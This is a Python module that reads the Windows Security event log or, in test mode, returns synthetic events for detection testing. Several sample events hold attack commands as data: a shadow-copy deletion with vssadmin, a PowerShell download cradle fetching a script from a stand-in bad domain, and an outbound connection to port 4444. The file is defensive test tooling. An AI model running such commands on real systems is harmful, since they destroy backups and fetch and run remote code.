"""Windows Event Log reader with safe test-mode simulation support."""

from datetime import datetime, timezone
import random
import socket
from typing import Any, Dict, List

# Attempt importing pywin32 Windows event log API if on Windows
try:
    import win32evtlog  # type: ignore
    WIN32_AVAILABLE = True
except ImportError:
    win32evtlog = None
    WIN32_AVAILABLE = False


class WindowsEventReader:
    """Reads authorized Windows Event Logs or yields safe test-mode synthetic events."""

    def __init__(self, hostname: str = "WINDOWS-HOST", test_mode: bool = False) -> None:
        self.hostname = hostname
        self.test_mode = test_mode
        self._last_record_number: int = 0

    def is_native_windows(self) -> bool:
        return WIN32_AVAILABLE and not self.test_mode

    def read_events(self, max_records: int = 25) -> List[Dict[str, Any]]:
        """Read pending event records from Windows Security log or generate safe lab events."""
        if self.is_native_windows():
            return self._read_native_security_log(max_records)
        else:
            return self.generate_synthetic_test_events()

    def _read_native_security_log(self, max_records: int) -> List[Dict[str, Any]]:
        """Read real Windows Security Event Log using pywin32 APIs (when run on Windows)."""
        events: List[Dict[str, Any]] = []
        if not win32evtlog:
            return events

        server = "localhost"
        logtype = "Security"
        flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

        try:
            handle = win32evtlog.OpenEventLog(server, logtype)
            records = win32evtlog.ReadEventLog(handle, flags, 0)
            for record in records[:max_records]:
                evt_id = record.EventID & 0xFFFF
                events.append({
                    "event_id": evt_id,
                    "timestamp": record.TimeGenerated.Format(),
                    "hostname": self.hostname,
                    "provider_name": record.SourceName,
                    "message": f"Windows Security Event {evt_id}",
                    "raw_data": str(record.StringInserts),
                })
            win32evtlog.CloseEventLog(handle)
        except Exception:
            pass

        return events

    def generate_synthetic_test_events(self) -> List[Dict[str, Any]]:
        """Generate safe, synthetic Windows defensive telemetry events for test mode and verification.
        
        No malware or malicious payloads are executed.
        """
        now = datetime.now(timezone.utc).isoformat()
        samples = [
            # 1. Event ID 4625: Windows Failed Logon (Simulated brute-force attack)
            {
                "event_id": 4625,
                "timestamp": now,
                "hostname": self.hostname,
                "username": "Administrator",
                "source_ip": "198.51.100.50",
                "destination_ip": "10.0.0.10",
                "message": f"Logon failure (Event ID 4625) for user Administrator from 198.51.100.50 (substatus: 0xC000006A - bad password)",
                "task_category": "Logon",
            },
            # 2. Event ID 4624: Windows Successful Logon
            {
                "event_id": 4624,
                "timestamp": now,
                "hostname": self.hostname,
                "username": "sec_analyst",
                "source_ip": "10.0.0.25",
                "destination_ip": "10.0.0.10",
                "message": f"Successful logon (Event ID 4624) for user sec_analyst via Negotiate (LogonType: 3 Network)",
                "task_category": "Logon",
            },
            # 3. Event ID 4688: Process creation (vssadmin shadow copy deletion simulation)
            {
                "event_id": 4688,
                "timestamp": now,
                "hostname": self.hostname,
                "username": "Administrator",
                "process_name": "vssadmin.exe",
                "command_line": "vssadmin.exe delete shadows /all /quiet",
                "message": "Process Creation (Event ID 4688): vssadmin.exe delete shadows /all /quiet",
                "task_category": "Process Creation",
            },
            # 4. Event ID 4104: PowerShell ScriptBlock logging (Simulated download cradle)
            {
                "event_id": 4104,
                "timestamp": now,
                "hostname": self.hostname,
                "username": "Administrator",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA...",
                "message": "ScriptBlock Logging (Event ID 4104): powershell.exe -ExecutionPolicy Bypass (New-Object Net.WebClient).DownloadString('http://bad-domain.com/malware.ps1')",
                "task_category": "Execute a Remote Command",
            },
            # 5. Event ID 1116: Windows Defender Threat Detection
            {
                "event_id": 1116,
                "timestamp": now,
                "hostname": self.hostname,
                "message": "Windows Defender Antivirus detected malware threat Win32/EICAR_Test_File (Quarantined)",
                "task_category": "Antivirus Protection",
            },
            # 6. Event ID 4672: Special Privileges Assigned
            {
                "event_id": 4672,
                "timestamp": now,
                "hostname": self.hostname,
                "username": "Administrator",
                "message": "Special privileges assigned to new logon for Administrator (SeSecurityPrivilege, SeBackupPrivilege)",
                "task_category": "Special Logon",
            },
            # 7. Event ID 5156: Windows Filtering Platform Network Connection
            {
                "event_id": 5156,
                "timestamp": now,
                "hostname": self.hostname,
                "source_ip": "10.0.0.10",
                "destination_ip": "198.51.100.89",
                "source_port": 50123,
                "destination_port": 4444,
                "protocol": "TCP",
                "message": "The Windows Filtering Platform has permitted an outbound connection to port 4444 (Event ID 5156)",
                "task_category": "Filtering Platform Connection",
            },
        ]
        return samples
